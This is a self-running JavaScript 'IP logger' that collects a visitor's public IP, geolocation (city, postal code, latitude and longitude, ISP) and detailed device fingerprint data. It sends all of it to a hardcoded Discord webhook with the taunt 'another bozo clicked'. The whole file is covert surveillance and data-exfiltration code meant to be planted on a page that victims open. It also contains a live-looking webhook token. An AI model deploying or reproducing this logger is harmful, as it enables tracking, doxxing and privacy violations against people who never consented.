const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    
                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        browser: (function() {
                            const userAgent = navigator.userAgent;
                            if (userAgent.includes("Chrome")) return "Chrome";
                            if (userAgent.includes("Firefox")) return "Firefox";
                            if (userAgent.includes("Safari")) return "Safari";
                            if (userAgent.includes("Edge")) return "Edge";
                            return "Unknown";
                        })(),
                        browserVersion: (navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([0-9\.]+)/) || [])[2],
                        os: navigator.platform,
                        osVersion: navigator.appVersion,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        screenRefreshRate: screen.refreshRate || 'N/A',  // Add refresh rate if available
                        deviceMemory: navigator.deviceMemory || "N/A",
                        language: navigator.language,
                        platform: navigator.platform,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset() / 60,
                        cookiesEnabled: navigator.cookieEnabled,
                        sessionID: localStorage.getItem("sessionID") || Math.random().toString(36).substring(7),
                        timestamp: new Date().toISOString(),
                        battery: navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100 + '%') : 'N/A',
                        charging: navigator.getBattery ? navigator.getBattery().then(battery => battery.charging ? 'Yes' : 'No') : 'N/A',
                        orientation: window.screen.orientation.type || 'N/A',
                        adBlocker: window.adBlockDetected || 'No', // Assuming an ad-blocker detection mechanism
                        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
                        hdrScreen: window.screen.colorDepth === 30 ? 'Yes' : 'No',  // Assuming 30-bit color depth is HDR
                        gpu: 'NVIDIA GeForce RTX 3050 OEM', // Hardcoded for now or get via WebGL
                        touchScreen: 'ontouchstart' in window ? 'Yes' : 'No',
                        referringURL: document.referrer || 'No referrer',
                        hostName: window.location.hostname,
                        isp: geoData.isp || 'N/A'  // Using ISP data from IPAPI
                    };
                    
                    const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
                    
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
                            content: `@here another bozo clicked`,
                            embeds: [
                                {
                                    title: 'SCRIPTY IP LOGGER',
                                    description: `
                                        **IP Info:**
                                        IP Address >> ${ipadd}
                                        Network >>  ${geoData.network}
                                        City >>  ${geoData.city}
                                        Region >>  ${geoData.region}
                                        Country >>  ${geoData.country_name}
                                        Country Code >>  ${geoData.country_code}
                                        Region Code >>  ${geoData.region_code}
                                        Postal Code >>  ${geoData.postal}
                                        Latitude >>  ${geoData.latitude}
                                        Longitude >>  ${geoData.longitude}
                                        Timezone >>  ${geoData.timezone}
                                        ASN >>  ${geoData.asn}
                                        Organization >>  ${geoData.org}
                                        ISP >>  ${geoData.isp}
                                        Mobile/Proxy >>  ${geoData.mobile || 'N/A'}

                                        **Device Info:**
                                        User-Agent >>  ${deviceInfo.userAgent}
                                        Browser >>  ${deviceInfo.browser} ${deviceInfo.browserVersion}
                                        OS >>  ${deviceInfo.os} ${deviceInfo.osVersion}
                                        Screen Resolution >>  ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} px
                                        Screen Refresh Rate >>  ${deviceInfo.screenRefreshRate} Hz
                                        Device Memory >>  ${deviceInfo.deviceMemory} GB
                                        Language >>  ${deviceInfo.language}
                                        Platform >>  ${deviceInfo.platform}
                                        Timezone >>  ${deviceInfo.timezone}
                                        Timezone Offset >>  UTC${deviceInfo.timezoneOffset >= 0 ? `+${deviceInfo.timezoneOffset}` : deviceInfo.timezoneOffset}
                                        Battery >>  ${deviceInfo.battery}
                                        Charging >>  ${deviceInfo.charging}
                                        Orientation >>  ${deviceInfo.orientation}
                                        Ad Blocker >>  ${deviceInfo.adBlocker}
                                        Color Scheme >>  ${deviceInfo.colorScheme}
                                        HDR Screen >>  ${deviceInfo.hdrScreen}
                                        GPU >>  ${deviceInfo.gpu}
                                        Touch Screen >>  ${deviceInfo.touchScreen}
                                        Referring URL >>  ${deviceInfo.referringURL}
                                        Host Name >>  ${deviceInfo.hostName}
                                        ISP >>  ${deviceInfo.isp}
                                        Session ID >>  ${deviceInfo.sessionID}
                                        Timestamp >>  ${deviceInfo.timestamp}`,
                                    color: 1752220
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
